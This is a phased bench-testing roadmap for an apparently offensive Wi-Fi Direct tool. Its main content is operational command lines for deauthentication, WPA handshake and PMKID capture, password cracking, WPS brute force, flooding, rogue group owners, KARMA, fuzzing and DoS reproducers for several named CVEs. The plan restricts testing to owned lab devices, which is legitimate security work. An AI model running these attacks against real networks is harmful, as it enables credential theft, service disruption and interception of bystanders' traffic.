# DIRECTAX Bench-Testing Roadmap

A phased plan to move every DIRECTAX module from "code-correct" to
"Phase-2 confirmed on real hardware." Each phase has a hard entry gate:
do not start a phase until its predecessor is green.

Only Phase 1 has been bench-verified in this repo so far (discovery on
Alfa AWUS036AXML). Every phase below is what you personally run and
paste back, then we mark rows verified in `docs/attack-matrix.md`.

Legend for status per test: `[ ]` not run, `[R]` running, `[P]` pass,
`[F]` fail (fix required), `[S]` skipped (target not available).

---

## Phase 0 - Environment

Goal: everything installed, adapter detected, regdomain sane. Zero
frames on air.

- [ ] `sudo apt install -y iw wireless-tools rfkill wpasupplicant hostapd dnsmasq aircrack-ng reaver pixiewps tshark hcxtools`
- [ ] `sudo python3 scan.py --preflight` reports `all required tools present` and the Alfa row shows `READY`
- [ ] `sudo iw reg set IN` (or your country ISO)
- [ ] `iw dev wlx00c0caba4c85 info` prints `phy2`, `type managed`
- [ ] `uname -r` reports kernel >= 6.5 (mt7921u P2P concurrency)
- [ ] `git -C ~/Music/wifi-direct pull` picks up latest commit

Gate: preflight is clean and no missing binaries.

---

## Phase 1 - Passive discovery (no injection, no `--authorized`)

Goal: verify the tool can put the card in monitor, hop channels, parse
P2P + WSC + RSN IEs, render the table.

**Already bench-verified in this repo.** Rerun to confirm your environment
still works.

- [ ] `sudo python3 scan.py discover --duration 30`
  - Expected: at least the summary table renders, monitor mode swap
    message appears in stderr, iface returns to managed on exit.
- [ ] `sudo python3 scan.py discover --duration 60 --detail`
  - Expected: per-device WSC + P2P attribute dump for any GO found.
- [ ] `sudo python3 scan.py sniff --duration 60 --p2p-pcap /tmp/p2p.pcap --eapol-pcap /tmp/eapol.pcap`
  - Expected: two pcaps written, subtype histogram printed.
- [ ] `tshark -r /tmp/p2p.pcap -Y 'wlan.fixed.category_code == 4 && wlan.fixed.publicact == 9'` should show any P2P Public Action frames.
- [ ] `sudo python3 scan.py driver-probe -i wlx00c0caba4c85`
  - Expected: `supports_monitor: true, supports_p2p_go: true`.

Gate: at least one P2P device visible in either passive discovery or
active discovery (next phase). If not, move test location or set up
a controlled target now.

---

## Phase 2 - Active discovery (first injection: Probe Requests)

Goal: verify the driver actually transmits, and that DIRECTAX pulls
richer WSC via P2P Search probes.

- [ ] `sudo python3 scan.py discover --duration 30 --active --authorized`
  - Expected: previously-silent GOs now emit Probe Responses containing
    manufacturer, model, device name, primary device type.
- [ ] Confirm by comparing `--detail` output before/after `--active`.
- [ ] If any GO still refuses to answer, note the BSSID; some GOs only
  respond after Provision Discovery, that becomes a later test.

Gate: at least one GO's WSC block populates fully after `--active`.
That proves your card transmits and the target processes our probes.

---

## Phase 3 - Controlled lab target setup

Goal: a Wi-Fi Direct GO you own so you can attack it without policy
concerns. Do NOT run Phases 4-6 against neighbours' devices.

Options, pick one:

**Option A - Another Linux box with wpa_supplicant P2P GO** (recommended)
```
sudo cat > /tmp/p2p_go.conf <<EOF
ctrl_interface=/var/run/wpa_supplicant
update_config=1
device_name=lab-target
device_type=1-0050F204-1
config_methods=push_button virtual_push_button keypad display
p2p_disabled=0
EOF
sudo wpa_supplicant -B -i wlan0 -c /tmp/p2p_go.conf
sudo wpa_cli -i wlan0 p2p_group_add persistent=0 freq=2437
sudo wpa_cli -i wlan0 wps_pbc
```
Expected: `iw dev` on the target shows `p2p-wlan0-0` as GO on channel 6.

**Option B - Android phone with Wi-Fi Direct enabled**
- Settings -> Wi-Fi -> Advanced -> Wi-Fi Direct -> phone visible as `DIRECT-XX-<name>`
- Note: phones rotate their P2P Interface Address, capture it fresh each session.

**Option C - Wi-Fi Direct printer** (HP LaserJet Pro, Canon PIXMA)
- Enable Wi-Fi Direct in printer settings.
- These are the best real-world Pixie-Dust targets.

Gate: your Alfa can `discover` this target and its BSSID shows in the
table with `role=GO`.

---

## Phase 4 - Attack modules against controlled target

Order matters: cheapest first, riskiest last. Each row assumes the
lab target from Phase 3.

Set an env for readability:
```
TARGET=<controlled-GO-BSSID>
CHAN=<GO-channel>
```

### 4.1 - Deauth (needs a client associated to the GO)

- [ ] Associate a second device to the lab target GO (a spare phone).
- [ ] `sudo python3 scan.py deauth --go $TARGET --client <spare-mac> --count 32 --authorized`
  - Expected JSON: `confirmed: true`, evidence pcap contains EAPOL or Reassoc-Req.

### 4.2 - Handshake capture

- [ ] Terminal A: `sudo python3 scan.py handshake --go $TARGET --channel $CHAN --duration 30 --output /tmp/hs.json`
- [ ] Terminal B: `sudo python3 scan.py deauth --go $TARGET --client <spare-mac> --count 8 --authorized`
- [ ] Expected: `/tmp/hs.json` reports `confirmed: true`, pcap under `evidence/` has >=2 EAPOL key-info variants.

### 4.3 - PMKID capture

- [ ] `sudo python3 scan.py pmkid --go $TARGET --channel $CHAN --attempts 5 --authorized`
- [ ] Expected: `pmkid` field is 32 hex chars, `hc22000_line` is well-formed with your ESSID hex.

### 4.4 - Hashcat pipeline (offline, no RF)

- [ ] Set lab target PSK to a known short weak passphrase (e.g. `directax12`) and add it to a small wordlist.
- [ ] `python3 scan.py hashcat --pcap /tmp/hs.pcap --wordlist /tmp/short.txt --runtime 60`
- [ ] Expected: `confirmed: true`, `psk: directax12`.

### 4.5 - Beacon flood (visible in scanners)

- [ ] `sudo python3 scan.py beacon-flood --channel $CHAN --count 30 --duration 15 --authorized`
- [ ] Confirm on a phone: Wi-Fi Direct scan on the phone shows the fake `DIRECT-XX-Fake*` devices.

### 4.6 - Provision Discovery flood

- [ ] `sudo python3 scan.py pd-flood --target $TARGET --count 200 --authorized`
- [ ] Expected: lab target GO's peer prompt storm (screen), or PD-Rsp stops.

### 4.7 - NoA starvation

- [ ] Have a P2P client associated to the lab GO transferring a large file over the group subnet.
- [ ] `sudo python3 scan.py noa-starve --go $TARGET --ssid <ssid> --channel $CHAN --duration 30 --authorized`
- [ ] Expected: file transfer rate drops to zero.

### 4.8 - MAC spoof

- [ ] `sudo python3 scan.py select-adapter` -> confirm restored after test.
- [ ] Spoof the lab GO's BSSID onto the Alfa; verify with `ip link show`. Restore.

### 4.9 - Invitation replay

- [ ] Complete a persistent-group pairing with the lab target first (`wpa_cli p2p_connect ... persistent`).
- [ ] `sudo python3 scan.py invitation --target <lab-device-addr> --group-bssid $TARGET --group-ssid <ssid> --channel $CHAN --authorized`
- [ ] Expected: JSON reports `invitation_response_success: true, eapol_followed: true, confirmed: true`.

### 4.10 - GO Negotiation hijack

- [ ] On the lab target: `wpa_cli p2p_connect <attacker-mac> pbc`.
- [ ] `sudo python3 scan.py goneg-hijack --our-mac <attacker-mac> --channel $CHAN --timeout 30 --authorized`
- [ ] Expected: `hijacked: true`.

### 4.11 - Pixie-Dust (needs unpatched Ralink/Broadcom/Realtek GO)

- [ ] Use a legacy home router with WPS enabled, not the wpa_supplicant P2P GO (modern hostapd is not Pixie-vulnerable).
- [ ] `sudo python3 scan.py pixie --go <legacy-ap-bssid> --channel <ch> --authorized`
- [ ] Expected: `confirmed: true`, `pin` and `psk` printed.

### 4.12 - WPS PIN brute (long, only if pixie fails)

- [ ] `sudo python3 scan.py wps-pin --go <legacy-ap-bssid> --channel <ch> --session-time 3600 --authorized`
- [ ] Expected within ~4-8 hours: `confirmed: true`, `pin` and `psk` printed.

### 4.13 - Rogue GO (needs second card)

- [ ] Plug in the AWUS036NHA. `sudo python3 scan.py --preflight` sees both.
- [ ] `sudo python3 scan.py rogue-go -i <second-iface> --ssid <target-ssid> --bssid <fake-bssid> --channel $CHAN --sae-transition --duration 300 --authorized`
- [ ] From a spare phone, roam to the rogue GO.
- [ ] Expected: dnsmasq log has `DHCPACK` to the phone's MAC.

### 4.14 - KARMA responder (needs second card, run alongside rogue-go)

- [ ] `sudo python3 scan.py karma -i <second-iface> --our-bssid <fake-bssid> --channel $CHAN --duration 300 --authorized`
- [ ] Confirm phone probes for other SSIDs get answered.

### 4.15 - P2P frame fuzzer

- [ ] `sudo python3 scan.py p2p-fuzz --target $TARGET --cases 500 --subtypes 7 0 3 --authorized`
- [ ] Expected: `crash_suspects` count and per-crash payload files under `evidence/`.
- [ ] If any crash suspect fires, minimize per DIRECTAX single-trigger rule.

### 4.16 - Miracast fuzzer (needs a Miracast sink running on a P2P client)

- [ ] Join the lab P2P group first (`wpa_cli p2p_connect ... pbc join`).
- [ ] Note the sink IP from `ip addr` on the joined interface.
- [ ] `python3 scan.py miracast-fuzz --sink <sink-ip> --cases 128 --seed 1 --authorized`
- [ ] Expected: anomaly counts per case class.

### 4.17 - Cross-connection pivot

- [ ] Join the lab P2P group as a Client.
- [ ] `sudo python3 scan.py cross-conn -i <p2p-client-iface> --pivot-target <infra-gateway-ip>`
- [ ] Expected: TCP reachability report; `confirmed_pivot: true` if the GO cross-bridges to infra.

Gate: every attack module either ships a green `confirmed: true`
against the lab target, or has a documented reason it did not fire
(target patched, PMF-required, driver dropped injection). Update
`docs/attack-matrix.md` accordingly.

---

## Phase 5 - CVE reproducer verification (unpatched targets)

Goal: prove each targeted CVE module fires when the target is
actually vulnerable, and does NOT fabricate confirmation when the
target is patched.

Ordering by ease of setting up an unpatched target:

### 5.1 - CVE-2019-17666 (rtlwifi P2P NoA)

Target: any Linux box with kernel < 5.3.11 and an RTL8188/RTL8192-family
adapter as a USB dongle. Old Kali VM or a Raspberry Pi with an RTL card.

- [ ] Set up target on a Wi-Fi network on `$CHAN`.
- [ ] `sudo python3 scan.py cve-2019-17666 --target <target-bssid> --channel $CHAN --authorized`
- [ ] Expected: `confirmed: true`, target's `dmesg -w` shows KASAN trace through `rtl_p2p_noa_ie`.
- [ ] Negative control: run against a patched kernel target; expect `confirmed: false` with reason `target likely patched`.

### 5.2 - CVE-2014-0997 (Android P2P Probe Response DoS)

Target: Android 4.4 or 5.0.x device with Wi-Fi Direct enabled. Old
Nexus or Moto G phones sit around $20 on eBay.

- [ ] Enable Wi-Fi Direct on target, note P2P Interface Address.
- [ ] `sudo python3 scan.py cve-2014-0997 --target <target-p2p-addr> --channel $CHAN --authorized`
- [ ] Expected: `confirmed: true`, target reboots or Wi-Fi service restarts.
- [ ] `adb logcat *:E` on target shows FATAL EXCEPTION through WifiP2pService.

### 5.3 - CVE-2021-0326 (wpa_supplicant P2P peer info)

Target: Android device without the Feb 2021 patch. Older stock ROMs.

- [ ] `sudo python3 scan.py cve-2021-0326 --target <target-p2p-addr> --channel $CHAN --authorized`
- [ ] Expected: `confirmed: true`, `adb logcat` shows wpa_supplicant SIGSEGV.

### 5.4 - CVE-2021-27803 (wpa_supplicant PD-Req UAF)

Target: Linux with hostap wpa_supplicant < 2.10 running as P2P Device.

- [ ] Set up wpa_supplicant 2.9 in a container on a lab box.
- [ ] `sudo python3 scan.py cve-2021-27803 --target <target-p2p-addr> --channel $CHAN --authorized`
- [ ] Expected: `confirmed: true`, target's `journalctl -u wpa_supplicant` shows the crash.

Gate: at least one CVE reproducer confirmed against an actually-vulnerable
target, and at least one negative control on a patched target
returning `confirmed: false`. That proves the tool does not lie either way.

---

## Phase 6 - Reporting

Goal: turn the roadmap outputs into a bench report.

- [ ] Fill the "Bench-verified" column in `docs/attack-matrix.md` per
  module.
- [ ] Move `discover` from bench-verified (already) plus every module
  that passed Phase 4/5.
- [ ] Copy the JSON outputs to `evidence/roadmap/` (git-ignored).
- [ ] Open a PR against this repo that just updates the matrix rows
  and adds a `docs/bench-report-YYYY-MM-DD.md` with the raw outputs.

---

## What to buy before starting Phase 4

Minimum:
- 1x Alfa AWUS036AXML (you have this)
- 1x Alfa AWUS036NHA (~$30) for the second-card scenarios in Phase 4.13
  and 4.14
- 1x spare Android phone (any Wi-Fi Direct capable, ~$20 secondhand)
  for CVE-2014-0997 and CVE-2021-0326 testing
- Optional: 1x legacy home router with WPS enabled for Pixie / PIN
  brute testing

Do not buy HackRF for this. See `docs/adapters.md`.

---

## What to skip

- Do NOT run Phase 4/5 attacks against neighbours' devices, printers
  in your building, or any device you do not own or lack written
  authorization for. Every attack in Phase 4/5 is either a DoS or
  a credential-exfil path.
- Do NOT run WPS PIN brute against a device you cannot factory-reset;
  reaver can trip firmware WPS lockout that requires vendor reset on
  some units.
- Do NOT run `rogue-go` in a location where a real user could
  accidentally roam onto it.

## Time estimate

- Phase 0-2: 30 minutes
- Phase 3 (target setup): 30-60 minutes
- Phase 4 (per attack): 10-30 minutes each, total ~4-6 hours
- Phase 5 (per CVE): depends on sourcing an unpatched target; 1-4 hours each
- Phase 6 (reporting): 1 hour
